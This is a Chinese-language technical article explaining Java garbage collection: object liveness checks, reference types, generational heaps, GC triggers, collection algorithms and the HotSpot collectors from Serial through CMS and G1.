而Java堆和方法区则不一样，一个接口的多个实现类需要的内存可能不一样，一个方法中的多个分支需要的内存也可能不一样，只有在程序处于运行期间，才知道创建哪些对象，这部分内存的分配和回收都是动态的，垃圾收集器关注的就是这部分内存。 对于从事C和C++程序开发的开发人员来说，在内存管理领域，他们既是拥有最高权利的皇帝，也是从事最基础工作的劳动人民—–既拥有每一个对象的所有权，又担负着每一个对象从生命开始到终结的维护责任。 对于Java程序员来说，虚拟机的自动内存分配机制的帮助下，不再需要为每一个new操作去写配对的delete/free代码，而且不容易出现内存泄露和内存溢出问题，看起来由虚拟机管理内存一切都很美好。不过，也正是因为Java程序员把内存控制的权利交给Java虚拟机，一旦出现内存泄露和溢出方面的问题，如果不了解虚拟机是怎样使用内存的，那排查错误将会是一项异常艰难的工作。 判断对象已死 - 哪些内存需要回收堆中几乎存放着Java世界中所有的对象实例，垃圾收集器在对堆回收之前，第一件事情就是要确定这些对象哪些还“存活”着，哪些对象已经“死去”（即不可能再被任何途径使用的对象）。 引用计数算法（Reference Counting）很多教科书判断对象是否存活的算法是这样的：给对象中添加一个引用计数器，每当有一个地方引用它时，计数器值加1；当引用失效时，计数器减1；任何时刻计数器都为0的对象就是不可能再被使用的。 引用计数算法的实现简单，判断效率也很高，在大部分情况下它都是一个不错的算法。但是Java语言中没有选用引用计数算法来管理内存，其中最主要的一个原因是它很难解决对象之间相互循环引用的问题。 实验 1234567891011121314151617181920212223242526/** * 执行后，objA和objB会不会被GC呢？ */ public class ReferenceCountingGC &#123; public Object instance = null; private static final int _1MB = 1024 * 1024; /** * 这个成员属性的唯一意义就是占点内存，以便能在GC日志中看清楚是否被回收过 */ private byte[] bigSize = new byte[2 * _1MB]; public static void main(String[] args) &#123; ReferenceCountingGC objA = new ReferenceCountingGC(); ReferenceCountingGC objB = new ReferenceCountingGC(); objA.instance = objB; objB.instance = objA; objA = null; objB = null; //假设在这行发生了GC，objA和ojbB是否被回收 System.gc(); &#125; &#125; 在testGC()方法中，对象objA和objB都有字段instance，赋值令objA.instance=objB及objB.instance=objA，除此之外，这两个对象再无其他引用。 实际，上这两个对象都已经不能再被访问，但是它们因为相互引用着对象方，因为它们的引用计数都不为0，于是引用计数算法无法通知GC收集器回收它们。 120.193: [GC 4418K-&gt;256K(61504K), 0.0046018 secs]0.198: [Full GC 256K-&gt;160K(61504K), 0.0125962 secs] 在运行结果中，可以看到GC日志中包含”4418K-&gt;256K”，老年代从4418K(大约4M，其实就是objA与objB)变为了141K，意味着虚拟并没有因为这两个对象相互引用就不回收它们，这也证明虚拟并不是通过通过引用计数算法来判断对象是否存活的。 大家可以看到对象进入了老年代，但是大家都知道，对象刚创建的时候是分配在新生代中的，要进入老年代默认年龄要到了15才行，但这里objA与objB却进入了老年代。这是因为Java堆区会动态增长，刚开始时堆区较小，对象进入老年代还有一规则，当Survior空间中同一代的对象大小之和超过Survior空间的一半时，对象将直接进行老年代。 可达性分析算法（Reachability Analysis）/根搜索算法(GC Roots Tracing)可达性分析算法（Reachability Analysis）是通过判断对象的引用链（Reference Chain）是否可达来决定对象是否可以被回收。 可达性分析算法是从离散数学中的图论引入的，程序把所有的引用关系看作一张图，通过一系列的名为 “GC Roots” 的对象作为起始点，从这些节点开始向下搜索，搜索所走过的路径称为引用链（Reference Chain）。当一个对象到 GC Roots 没有任何引用链相连（用图论的话来说就是从 GC Roots 到这个对象不可达）时，则证明此对象是不可用的。 下图对象object5, object6, object7虽然有互相判断，但它们到GC Roots是不可达的，所以它们将会判定为是可回收对象。 在Java中，可作为 GC Root 的对象包括以下几种： 虚拟机栈（栈帧中的局部变量表）中引用的对象； 方法区中类静态属性引用的对象； 方法区中常量引用的对象； 本地方法栈中Native方法引用的对象； 不同的引用无论是通过引用计数算法判断对象的引用数量，还是通过根搜索算法判断对象的引用链是否可达，判定对象是否存活都与“引用”有关。 在JDK 1.2之前，Java中的引用的定义很传统：如果reference类型的数据中存储的数值代表的是另外一块内存的起始地址，就称这块内存代表着一个引用。这种定义很纯粹，但是太过狭隘，一个对象在这种定义下只有被引用或者没有被引用两种状态。 对于如何描述一些“食之无味，弃之可惜”的对象就显得无能为力。 我们希望能描述这样一类对象：当内存空间还足够时，则能保留在内存之中；如果内存在进行垃圾收集后还是非常紧张，则可以抛弃这些对象。很多系统的缓存功能都符合这样的应用场景。 在JDK 1.2之后，Java对引用的概念进行了扩充，将引用分为强引用（Strong Reference）、软引用（Soft Reference）、弱引用（Weak Reference）、虚引用（Phantom Reference）四种，这四种引用强度依次逐渐减弱。 强引用（Strong Reference）：就是指在程序代码之中普遍存在的，类似“Object obj = new Object()”这类的引用，只要强引用还存在，垃圾收集器永远不会回收掉被引用的对象。 软引用（Weak Reference）：用来描述一些还有用，但并非必需的对象。对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中并进行第二次回收。如果这次回收还是没有足够的内存，才会抛出内存溢出异常。在JDK 1.2之后，提供了SoftReference类来实现软引用。 弱引用（Weak Reference）：也是用来描述非必需对象的，但是它的强度比软引用更弱一些，被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象。在JDK 1.2之后，提供了WeakReference类来实现弱引用。 虚引用（Phantom Reference）：也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是希望能在这个对象被收集器回收时收到一个系统通知。在JDK 1.2之后，提供了PhantomReference类来实现虚引用。 对象标记过程在根搜索算法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑”阶段，要真正宣告一个对象死亡，至少要经历两次标记过程：如果对象在进行根搜索后发现没能与GC Roots相连接的引用链，那它将会被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行finalize()方法。当对象没有覆盖finalize()方法，或者finalize()方法已经被虚拟机调用过，虚拟机将这两种情况都视为“没有必要执行”。 如果这个对象被判定为有必要执行finalize()方法，那么这个对象将会被放置在一个名为F-Queue的队列之中，并在稍后由一条虚拟机自动建立的、低优先级的Finalizer线程去挪。 这里所谓的“执行”是指虚拟机会触发这个方法，但并不承诺会等待它运行结束。这样做的原因是，如果一个对象在finalize()方法中执行缓慢，或者发生了死循环（更极端的情况），将很可能导致F-Queue队列中的其他对象永久处于等待状态，甚至导致整个内存回收系统崩溃。 finalize()方法是对象逃脱死亡命运的最后一次机会，稍后GC将对F-Queue中的对象进行第二次小规模的标记： 如果对象要在finalize()中成功拯救自己——只要重新与引用链上的任何一个对象建立关联即可，譬如把自己（this关键字）赋值给某个类变量或对象的成员变量，那在第二次标记时它将被移除出“即将回收”的集合； 如果对象这时候还没有逃脱，那它就真的离死不远了。 回收方法区很多人认为方法区（或者HotSpot虚拟机中的永久代）是没有垃圾收集的，Java虚拟机规范中确实说过可以不要求虚拟机在方法区实现垃圾收集，而且在方法区中进行垃圾收集的“性价比”一般比较低：在堆中，尤其是在新生代中，常规应用进行一次垃圾收集一般可以回收70%〜95%的空间，而永久代的垃圾收集效率远低于此。 永久代的垃圾收集主要回收两部分内容：废弃常量和无用的类。 回收废弃常量与回收Java堆中的对象非常类似。以常量池中字面量的回收为例，假如一个字符串“abc”已经进入了常量池中，但是当前系统没有任何一个String对象是叫做“abc”的，换句话说是没有任何String对象引用常量池中的“abc”常量，也没有其他地方引用了这个字面量，如果在这时候发生内存回收，而且必要的话，这个“abc”常量就会被系统“请”出常量池。常量池中的其他类（接口）、方法、字段的符号引用也与此类似。 判定一个常量是否是“废弃常量”比较简单，而要判定一个类是否是“无用的类”的条件则相对苛刻许多。类需要同时满足下面3个条件才能算是“无用的类”： 该类所有的实例都已经被回收，也就是Java堆中不存在该类的任何实例。 加载该类的ClassLoader已经被回收。 该类对应的java.lang.Class 对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。 虚拟机可以对满足上述3个条件的无用类进行回收，这里说的仅仅是“可以”，而不是和对象一样，不使用了就必然会回收。是否对类进行回收，HotSpot虚拟机提供了-Xnoclassgc参数进行控制，还可以使用-verbose:class及-XX:+TraceClassLoading、 -XX:+TraceClassUnLoading查看类的加载和卸载信息。 在大量使用反射、动态代理、CGLib等bytecode框架的场景，以及动态生成JSP和OSGi这类频繁自定义ClassLoader的场景都需要虚拟机具备类卸载的功能，以保证永久代不会溢出。 什么时候进行垃圾回收？ 为了增大垃圾收集的效率，所以JVM将堆进行分代，分为不同的部分。 如何分代？如图所示，虚拟机中的共划分为三个代：新生代（Young Generation）、老年代（Tenured Generation）和持久代（Permanent Generation）。其中持久代主要存放的是Java类的类信息，与垃圾收集要收集的Java对象关系不大。新生代和老年代的划分是对垃圾收集影响比较大的。 新生代（Young Generation）所有新生成的对象首先都是放在新生代的。新生代的目标就是尽可能快速的收集掉那些生命周期短的对象。 新生代分三个区。一个Eden区，两个Survivor区(一般而言)。大部分对象在Eden区中生成。 需要注意，Survivor的两个区是对称的，没先后关系。所以同一个区中，可能同时存在从Eden复制过来对象和从前一个Survivor复制过来的对象。而复制到年老区的只有从第一个Survivor区过来的对象。而且，Survivor区总有一个是空的。同时，根据程序需要，Survivor区是可以配置为多个的（多于两个），这样可以增加对象在新生代中的存在时间，减少被放到老年代的可能。 老年代（Tenured Generation）在新生代中经历了N次垃圾回收后仍然存活的对象，就会被放到老年代中。因此，可以认为老年代中存放的都是一些生命周期较长的对象。 持久代（Permanent Generation）持久代对垃圾回收没有显著影响，但是有些应用可能动态生成或者调用一些class，例如Hibernate等，在这种时候需要设置一个比较大的持久代空间来存放这些运行过程中新增的类。持久代大小通过-XX:MaxPermSize=&lt;N&gt;进行设置（JDK1.8后被元空间取代）。 在 JDK 1.8 之后，原来永久代的数据被分到了堆和元空间（Metaspace）中。元空间存储类的元信息，静态变量和常量池等放入堆中。 注意，元空间使用的是物理内存，而不再使用 JVM 内存。 什么情况下触发垃圾回收由于对象进行了分代处理，因此垃圾回收区域、时间也不一样。GC有两种类型：Young GC（Minor GC）和Full GC（Major GC）。 Young GC（Minor GC）一般情况下，对象在新生代Eden区中分配。 当Eden区没有足够空间进行分配时，虚拟机将发起一次Young GC（Minor GC），对Eden区域进行GC，清除非存活对象，并且把尚且存活的对象移动到Survivor区。 然后整理Survivor的两个区。这种方式的GC是对新生代的Eden区进行，不会影响到老年代。因为大部分对象都是从Eden区开始的，同时Eden区不会分配的很大，所以Eden区的GC会频繁进行。 因而，一般在这里需要使用速度快、效率高的算法，使Eden区能尽快空闲出来。 注意young GC中有部分存活对象会晋升到老年代，所以young GC后，老年代的占用量通常会有所升高。 新生代通常存活时间较短通常基于Copying算法进行回收，所谓Copying算法就是扫描出存活的对象，并复制到一块新的完全未使用的空间中，对应于新生代，就是在Eden和FromSpace或ToSpace之间copy。新生代采用空闲指针的方式来控制GC触发，指针保持最后一个分配的对象在新生代区间的位置，当有新的对象要分配内存时，用于检查空间是否足够，不够就触发GC。当连续分配对象时，对象会逐渐从Eden到Survivor，最后到老年代。 Old GC老年代与新生代不同，老年代对象存活的时间比较长、比较稳定，因此通常采用标记（Mark）算法来进行回收，所谓标记就是扫描出存活的对象，然后再进行回收未被标记的对象，回收后对用空出的空间要么进行合并、要么标记出来便于下次进行分配，总之目的就是要减少内存碎片带来的效率损耗。 由于老年代中的对象生命周期比较长，因此Major GC并不频繁，一般都是等待老年代满了后才进行Full GC，而且其速度一般会比Minor GC慢10倍以上。 Full GC（Major GC）对于 Minor GC，其触发条件非常简单，当 Eden 空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件： 1 调用 System.gc()只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。 2 老年代空间不足老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。 为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过 -Xmn 虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过 -XX:MaxTenuringThreshold 调大对象进入老年代的年龄，让对象在新生代多存活一段时间。 3 空间分配担保失败使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果担保失败会执行一次 Full GC。 垃圾收集算法 - 如何回收背景在介绍垃圾收集算法之前，我们先介绍一下进行回收时的一些基本操作 Step 1: Marking 标记 第一步就是标记，也就是垃圾收集器会找出那些需要回收的对象所在的内存和不需要回收的对象所在的内存，并把它们标记出来，简单的说，也就是先找出垃圾在哪。 所有堆中的对象都会被扫描一遍，以此来确定回收的对象，所以这通常会是一个相对比较耗时的过程。 Step 2: Normal Deletion垃圾收集器会清除掉上一步标记出来的那些需要回收的对象区域。 存在的问题就是碎片问题： 标记清除之后会产生大量不连续的内存碎片，空间碎片太多可能会导致以后在程序运行过程中需要分配较大对象时，无法找到足够的连续内存而不得不提前触发另一次垃圾收集动作。 Step 2a: Deletion with Compacting 压缩 由于简单的清除可能会存在碎片的问题，所以又出现了压缩清除的方法，也就是先清除需要回收的对象，然后再对内存进行压缩操作，将内存分成可用和不可用两大部分。 垃圾收集算法标记-清除（Mark-Sweep）算法最基础的收集算法是“标记-清除”（Mark-Sweep）算法，算法分为“标记”和“清除”两个阶段：首先标记出所有需要回收的对象，在标记完成后统一回收所有被标记的对象。 之所以说标记-清除算法是最基础的收集算法，说因为后续的收集算法都是基于这种思路，并对其不足进行改进而得到的。 不足 一个是效率问题，标记和清除两个过程的效率都不高；另一个是空间问题，标记清除之后会产生大量不连续的内存碎片，空间碎片太多可能会导致以后在程序运行过程中需要分配较大对象时，无法找到足够的连续内存，而不得不提前触发另一次垃圾收集动作。 复制算法它将可用内存容量划分为大小相等的两块，每次只使用其中的一块。当这一块用完之后，就将还存活的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉。 这样使得每次都是对其中的一块进行内存回收，也不会产生碎片等复杂情况，只要移动堆顶指针，按顺序分配内存即可，实现简单，运行高效。 只是这种算法的代价是将可使用的内存缩小为一半，代价较大。 现在的商业虚拟机都采用这种收集算法来回收新生代，IBM公司的专门研究表明，新生代中的对象98%是“朝生夕死”的，所以并不需要按照1:1的比例来划分内存空间，而是将内存分为一块较大的Eden空间和两块较小的Survivor空间，每次使用Eden和其中一块Survivor。 当回收时，将Eden和Survivor中还存活着的对象一次性的复制到另外一块Survivor空间上，最后清理掉Eden和刚才用过的Survivor空间。 HotSpot虚拟机默认Eden和Survivor的大小比例是8:1，也就是每次新生代中可用内存为整个新生代容量的90%（80%+10%），只有10%的内存会被“浪费”。当然，98%的对象可回收只是一般场景下的数据，我们没有办法保证每次回收都只有不多于10%的对象存活，当Survivor空间不够用时，需要依赖其他内存（这里指老年代）进行分配担保（Handle Promotion）。 内存的分配担保就好比我们去银行借款，如果我们信誉很好，在98%的情况下都能按时偿还，于是银行可能会默认我们下一次也能按时按量的偿还贷款，只需要有一个担保人能保证如果我不能还款时，可以从他的账户扣钱，那银行就认为没有风险了。内存的分配担保也一样，如果另外一块Survivor空间没有足够空间存放上一次新生代收集下来的存活对象时，这些对象将直接通过分配担保机制进入老年代。 标记 - 整理算法背景复制收集算法在对象存活率较高时就要进行大量的复制操作，效率将会变低。更关键的是，如果不想浪费50%的空间，就需要额外的空间进行分配担保，以应对被使用的内存中所有对象都100%存活的极端情况，所以在老年代一般不能直接选用复制算法。 思想根据老年代的特点，有人提出了另外一种“标记-整理”算法，其实这里的标记-整理就是在标记-清除算法中加了一步：整理。即就是“标记-整理-清除”算法。前边都是一样，先标记处可达对象（存活对象），但是后续步骤不是直接对可回收对象进行清除，而是让所有存活的对象向一端移动，然后直接清除掉端边界以外的内存。 较“标记-清除”算法而言，多了一步移动（整理）的过程，效率低。 分代收集算法(Generational Collection)当前商业虚拟机的垃圾收集都采用“分代收集”（Generational Collection）算法，这种算法并没有什么新的思想，只是根据对象存活周期的不同，将内存划分为几块。一般是把Java堆分为新生代（Young generation）和老年代（Tenured generation），这样就可以根据各个年代的特点采用最适当的收集算法。 新生代（Young generation）：每次垃圾收集时都发现大批对象死去，对象存活率低。选用复制算法。 老年代（Tenured generation）：对象存活率高，没有额外的内存空间对它进行分配担保，就必须选用“标记-清除”或“标记-整理”算法进行回收。 垃圾收集器如果说收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。Java虚拟机规范中对垃圾收集器应该如何实现并没有任何规定，所以不同的厂商、不同版本的虚拟机可以根据需要提供不同的收集器。我们这里讨论的收集器是基于JDK1.7 Update 14之后的HotSpot虚拟机，其包含的所有收集器如下图所示： 图中上下两个区域分别代表收集器是属于新生代收集器还是老年代收集器，如果两个收集器之间存在连线，就说明它们可以搭配使用。 Serial收集器Serial（串行）垃圾收集器是最基本、发展历史最悠久的收集器。在JDK1.3.1前，是HotSpot新生代收集的唯一选择。 Serial收集器是一个单线程的收集器，但它的“单线程”的意义并不仅仅是说明它只会使用一个CPU或一条收集线程去完成垃圾收集工作，更重要的是在它进行垃圾收集时，必须暂停其他所有的工作线程（Sun将这件事情称之为“stop the world”），直到它收集结束。 “Stop the world”听上去有点酷，这项工作实际上是由虚拟机在后台自动发起和自动完成的，在用户不可见的情况下把用户的正常工作的线程全部停掉，这对很多应用来说都是难以接受的。 对于“Stop The World”带给用户的不良体验，虚拟机的设计者们表示完全理解，但也表示非常委屈：“你妈妈在给你打扫房间的时候，肯定也会让你老老实实地在椅子上或者房间外待着，如果她一边打扫，你一边乱扔纸屑，这房间还能打扫完？”这确实是一个合情合理的矛盾，虽然垃圾收集这项工作听起来和打扫房间属于一个性质的，但实际上肯定还要比打扫房间复杂得多啊！ Serial /Serial Old收集器运行示意图如下（注意是只有一个线程在收集）： 从JDK 1.3开始，一直到现在最新的JDK 1.7，HotSpot虚拟机开发团队为消除或者减少工作线程因内存回收而导致停顿的努力一直在进行着，从Serial收集器到Parallel收集器，再到Concurrent Mark Sweep（CMS）乃至GC收集器的最前沿成果Garbage First（G1）收集器，我们看到了一个个越来越优秀（也越来越复杂）的收集器的出现，用户线程的停顿时间在不断缩短，但是仍然没有办法完全消除（这里暂不包括RTSJ中的收集器）。寻找更优秀的垃圾收集器的工作仍在继续！ 写到这里，笔者似乎已经把Serial收集器描述成一个“老而无用、食之无味弃之可惜”的鸡肋了，但实际上到现在为止，它依然是虚拟机运行在Client模式下的默认新生代收集器。它也有着优于其他收集器的地方：简单而高效（与其他收集器的单线程比），对于限定单个CPU的环境来说，Serial收集器由于没有线程交互的开销，专心做垃圾收集自然可以获得最高的单线程收集效率。在用户的桌面应用场景中，分配给虚拟机管理的内存一般来说不会很大，收集几十兆甚至一两百兆的新生代（仅仅是新生代使用的内存，桌面应用基本上不会再大了），停顿时间完全可以控制在几十毫秒最多一百多毫秒以内，只要不是频繁发生，这点停顿是可以接受的。所以，Serial收集器对于运行在Client模式下的虚拟机来说是一个很好的选择。 ParNew收集器 ParNew收集器其实就是Serial收集器的多线程版本，除了使用多线程进行垃圾收集之外，其与行为包括Serial收集器都可用的所有控制参数（例如 ：-XX：SurvivorRatio、-XX:PretenureSizeThreshold\\ -XX:HandlePromotionFailure 等）、收集算法、Stop The World、对象分配规则、回售策略等都与Serial收集器完全一样。 在现实上，这两种收集器也共用了相当多的代码。ParNew收集器的工作过程如下图： ParNew收集器除了多线程收集之外，其他与Serial收集器相比并没有太多创新之处，但它却是许多运行在Server，模式下的虚拟机中首选的新生代收集器，其中有一个与性能无关但很重要的原因是，除了Serial 收集器外，目前只有它能与CMS收集器配合工作。 在JDK1.5时期，HotSSpot推出了一款在强交互应用中，几乎可称为有划时代意义的垃圾收集器–CMS收集器（Concurent Mark Sweep）。这款收集器是HoSpot 虚拟机中第教真正意义上的并发（Comcuren）收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作，用前面那个例子的话来说，就是做到了在你的妈打扫房间的时候你还能一边往地上扔纸屑。 不幸的是，CMS作为老年代的收集器，却无法与JDK 1.4.0 中已经存在的新生代收集器Paralel Scavenge配合工作，所以在JDK 1.5中使用CMS来收集老年代的时候，新生代只能选择ParNew或者Serial收集器中的一个。 ParNew收集器也是使用-XX:+UseConcMarkSwcepGC选项后的默认新生代收集器，也可以使用-XX:+UseParNewGC选项来强制指定它。 ParNew收集器在单CPU的环境中绝对不会有比Serial收集器更好的效果，甚至由于存在线程交互的开销，该收集器在通过超线程技术实现的两个CPU的环境中都不能百分之百地保证可以超越Serial收集器。当然，随着可以使用的CPU的数量的增加，它对于GC时系统资源的有效利用还是很有好处的。它默认开启的收集线程数与CPU的数量相同，在CPU非常多（譬如32个，现在CPU动辄就4核加超线程，服务器超过32个逻辑CPU的情况越来越多了）的环境下，可以使用XX:ParllGCThreads参数来限制垃圾收集的线程数。 Parallel Scavenge收集器Parallel Scavenge收集器也是一个新生代收集器，它也是使用复制算法的收集器，又是并行的多线程收集器，看上去和ParNew都一样，那它有什么特别之处呢？ Parallel Scavenge收集器的特点是它的关注点与其他收集器不同，CMS等收集器的关注点尽可能地缩短垃圾收集时用户线程的停顿时间，而Parallel Scavenge收集器的目标是达到一个可控制的吞吐量。所谓吞吐量就是CPU用于运行用户代码的时间与CPU总消耗时间的比值，即吞吐量＝运行用户代码时间／（运行用户代码时间＋垃圾收集时间），如果虚拟机总共运行需要100分钟，其中垃圾收集花掉1分钟，那吞吐量就是99%。 停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户的体验；而高吞吐量则可用最高效率地利用CPU时间，尽快地完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。 Parallel Scavenge收集器提供了两个参数用户精确控制吞吐量，分别是控制最大垃圾收集停顿时间的-XX:MaxGCPauseMillis参 数及直接设置吞吐量大小的-XX:GCTimeRatio参数。 MaxGCPauseMillis参数允许的值是一个大于0的毫秒数，收集器将尽力保证内存回收花费的时间不超过设定值。不过大家不要异想天开地认为如果把这个参数的值设置得稍小一点就能使得系统的垃圾收集速度变得更快，GC停顿时间缩短是以牺牲吞吐量和新生代空间来换取的：系统把新生代调小一些，收集300MB新生代肯定比收集500MB快吧，这也直接导致垃圾收集发生得更频繁一些，原来10秒收集一次、每次停顿100毫秒，现在变成5秒收集一次、每次停顿70毫秒。停顿时间的确在下降，但吞吐量也降下来了。 GCTimeRatio参数的值应当是一个大于0小于100的整数，也就是垃圾收集时间占总时间的比率，相当于是吞吐量的倒数。如果把此参数设置为19，那允许的最大GC时间就占总时间的5%，默认值为99，就是允许最大1%的垃圾收集时间。 由于与吞吐量关系密切，Parallel Scavenge收集器也经常被称为“吞吐量优先”收集器。除上述两个参数之外，Parallel Scavenge收集器还有一个参数 -XX:+UseAdaptiveSizePolicy值得关注。这是一个开关参数，当这个参数打开之后，就不需要手工指定新生代的大小（-Xmn）、Eden与Survivor区的比例(-XX:SurvivorRatio)、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的挺短时间或最大的吞吐量，这个调节方式称为GC自适应的调节策略。 Serial Old收集器Serial Old收集器是Serial收集器的老年代版本，它是一个单线程收集器，使用“标记－整理”算法。这个收集器的主要意义也是被Client模式下的虚拟机使用。 在server模式下，它主要还有两大用途： 一个是在JDK1.5及之前的版本中与Parallel Scavenge收集器搭配使用； 另外一个就是作为CMS收集器的后备元，在并发收集发生 Concurrent Mode Failure的时候使用。 Parallel Old收集器Parallel Old是Parallel Scavenge收集器的老年代版本，使用多线程和“标记－整理”算法。 这个收集器是在JDK1.6中才开始提供的，在此之前，新生代的Parallel Scavenge收集器一直处于比较尴尬的状态。原因是，如果新生代选择了Parallel Scavenge收集器，老年代除了Serial Old收集器外别无选择。由于单线程的老年代收集器在服务端应用性能上“拖累”，即便使用Parallel Scavenge也未必能在整体应用上获得吞吐量最大化的效果，又因为老年代集中无法充分利用服务器多CPU的处理能力，在老年代很呆而且硬件比较高级的环境中，这种组合的吞吐量甚至还不一定有ParNew加CMS的组合“给力”。 直到Parallel Old收集器出现后，“吞吐量优先”收集器终于有了比较名副其实的应用组合，在注重吞吐量及CPU资源敏感的场合，都可以优先考虑Parallel Scavenge加Parallel Old收集器。 CMS（Concurrent Mark Sweeps）收集器CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。 目前很大一部分的Java应用都集中在互联网站或B/S系统的服务端上，这类应用尤其重视服务的响应速度，希望系统停顿时间最短，以给用户带来较好的体验。CMS收集器就非常符合这类应用的需求。 从名字（包含“Mark Sweep”）上就可以看出CMS收集器是基于“标记-清除”算法实现的，它的运作过程相对于前面几种收集器来说要更复杂一些，整个过程分为4个步骤，包括： 初始标记（CMS initial mark） 并发标记（CMS concurrent mark） 重新标记（CMS remark） 并发清除（CMS concurrent sweep） 其中初始标记、重新标记这两个步骤仍然需要“Stop The World”。初始标记仅仅只是标记一下GC Roots能直接关联到的对象，速度很快，并发标记阶段就是进行GC Roots Tracing的过程，而重新标记阶段则是为了修正并发标记期间，因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一 般会比初始标记阶段稍长一些，但远比并发标记的时间短。 由于整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，所以总体上来说，CMS收集器的内存回收过程是与用户线程一起并发地执行的。通过下图可以比较清楚地看到CMS收集器的运作步骤中并发和需要停顿的时间。 CMS是一款优秀的收集器，它的最主要优点在名字上已经体现出来了：并发收集、低停顿，Sun的一些官方文档里面也称之为并发低停顿收集器（Concurrent Low Pause Collector）。但是CMS还远达不到完美的程度，它有以下三个显著的缺点： CMS收集器对CPU资源非常敏感。其实，面向并发设计的程序都对CPU资源比较敏感。在并发阶段，它虽然不会导致用户线程停顿，但是会因为占用 了一部分线程（或者说CPU资源）而导致应用程序变慢，总吞吐量会降低。CMS默认启动的回收线程数是（CPU数量+3）/ 4，也就是当CPU在4个以上时，并发回收时垃圾收集线程最多占用不超过25%的CPU资源。但是当CPU不足4个时（譬如2个），那么CMS对用户程序 的影响就可能变得很大，如果CPU负载本来就比较大的时候，还分出一半的运算能力去执行收集器线程，就可能导致用户程序的执行速度忽然降低了50%，这也 很让人受不了。为了解决这种情况，虚拟机提供了一种称为“增量式并发收集器”（Incremental Concurrent Mark Sweep / i-CMS）的CMS收集器变种，所做的事情和单CPU年代PC机操作系统使用抢占式来模拟多任务机制的思想一样，就是在并发标记和并发清理的时候让GC 线程、用户线程交替运行，尽量减少GC线程的独占资源的时间，这样整个垃圾收集的过程会更长，但对用户程序的影响就会显得少一些，速度下降也就没有那么明 显，但是目前版本中，i-CMS已经被声明为“deprecated”，即不再提倡用户使用。 CMS收集器无法处理浮动垃圾（Floating Garbage），可能出现“Concurrent Mode Failure”失败而导致另一次Full GC的产生。由于CMS并发清理阶段用户线程还在运行着，伴随程序的运行自然还会有新的垃圾不断产生，这一部分垃圾出现在标记过程之后，CMS无法在本次 收集中处理掉它们，只好留待下一次GC时再将其清理掉。这一部分垃圾就称为“浮动垃圾”。也是由于在垃圾收集阶段用户线程还需要运行，即还需要预留足够的 内存空间给用户线程使用，因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集，需要预留一部分空间提供并发收集时的程序运作使 用。在默认设置下，CMS收集器在老年代使用了68%的空间后就会被激活，这是一个偏保守的设置，如果在应用中老年代增长不是太快，可以适当调高参数 -XX:CMSInitiatingOccupancyFraction的值来提高触发百分比，以便降低内存回收次数以获取更好的性能。CMS需要较大的内存空间去运行垃圾收集,此时用户程序也在运行,要是CMS运行期 间预留的内存无法满足程序需要，就会出现一次“Concurrent Mode Failure”失败，这时候虚拟机将启动后备预案：临时启用Serial Old收集器来重新进行老年代的垃圾收集，这样停顿时间就很长了。所以说参数-XX:CMSInitiatingOccupancyFraction设置 得太高将会很容易导致大量“Concurrent Mode Failure”失败，性能反而降低。 还有最后一个缺点，在本节在开头说过，CMS是一款基于“标记-清除”算法实现的收集器，如果读者对前面这种算法介绍还有印象的话，就可能想到这 意味着收集结束时会产生大量空间碎片。空间碎片过多时，将会给大对象分配带来很大的麻烦，往往会出现老年代还有很大的空间剩余，但是无法找到足够大的连续 空间来分配当前对象，不得不提前触发一次Full GC。为了解决这个问题，CMS收集器提供了一个-XX:+UseCMSCompactAtFullCollection开关参数，用于在“享受”完 Full GC服务之后额外免费附送一个碎片整理过程，内存整理的过程是无法并发的。空间碎片问题没有了，但停顿时间不得不变长了。虚拟机设计者们还提供了另外一个 参数-XX: CMSFullGCsBeforeCompaction，这个参数用于设置在执行多少次不压缩的Full GC后，跟着来一次带压缩的。 G1（Garbage First）收集器G1（Garbage First）收集器是当前收集器技术发展的最前沿成果，在JDK1.6_Updata14中提供了Early Access版本的G1收集器以供适用。 G1收集器是垃圾收集器理论进一步发展的产物，它与前面的CMS收集器相比有两个显著的改进： G1收集器是基于“标记－整理”算法实现的收集器，也就是说它不会产生碎片，这对于长时间运行的应用系统来说比较重要。 它可以非常精确地控制停顿，既能让使用者明确指定爱一个长度为M毫秒的时间片段内，消耗在垃圾收集上的时间不得超过N毫秒，这几乎已经是实时Java的垃圾收集器的特征了。 G1收集器可以实现在基本不牺牲吞吐量的前提下完成低停顿的内存回收，这是由于它能够极力地避免完全区域的垃圾收集，之前的收集器进行收集的范围都是整个新生代或老年代，而G1将整个Java堆划分为多个大小固定的独立区域，并且跟踪这些区域里面的垃圾堆积程度，在后台维护一个优先列表，每次根据允许的收集时间，优先回收垃圾最多的区域。区域划分及优先级的区域回收，保证了G1收集器在有限的时间内可以获得可以获得最高的收集效率。 内存分配与回收策略Java技术体系中所提倡的 自动内存管理 最终可以归结为自动化地解决了两个问题： 给对象分配内存 以及 回收分配给对象的内存， 